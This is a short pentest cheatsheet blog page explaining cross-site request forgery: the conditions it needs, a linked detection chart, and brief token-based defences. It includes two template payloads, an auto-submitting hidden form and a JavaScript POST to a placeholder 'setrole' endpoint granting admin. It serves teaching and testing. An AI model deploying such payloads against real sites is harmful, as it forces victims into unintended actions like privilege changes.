---
title: "CSRF attack"
subtitle: ""
draft: false
author: "Hato0"
description: "CSRF cheatsheet"
Last Update: <time datetime="{{ .Page.Lastmod.Format "Mon Jan 10 17:13:38 2020 -0700" }}" class="text-muted">  {{ $.Page.Lastmod.Format "January 02, 2006" }} </time>
Date: 2022-06-20

tags: ["web", "penetest", "csrf"]
categories: ["Penetest - Web"]

hiddenFromHomePage: true
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# Cross-site request forgery

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This attack can happend by phishing, clone site, etc ... Conditions have to be present for this attack  to be perform : 

-   **A relevant action.** : Change password, email, rights, ...
-   **Cookie-based session handling.** : Website with cookie base for sessions are an incredible candidate for this type of attack
-   **No unpredictable request parameters.** Every element should be known or obtainable to be able to forge the request

Here is a schema to check for CSRF from PATT:

![alt CSRF_Detection](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true)


## Some examples

- No defenses
    {{< highlight html "lineNos=false" >}}
<form method="$method" action="$url">  
    <input type="hidden" name="$param1name" value="$param1value">  
</form>  
<script>  
    document.forms\[0\].submit();  
</script>
    {{< /highlight >}}

- JSon and JS combined

    {{< highlight javascript "lineNos=false" >}}
<script>
var xhr \= new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.setRequestHeader("Content-Type", "text/plain");
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
    {{< /highlight >}}

## How to prevent them 

-   Unpredictable with high entropy, as for session tokens in general.
-   Tied to the user's session.
-   Strictly validated in every case before the relevant action is executed.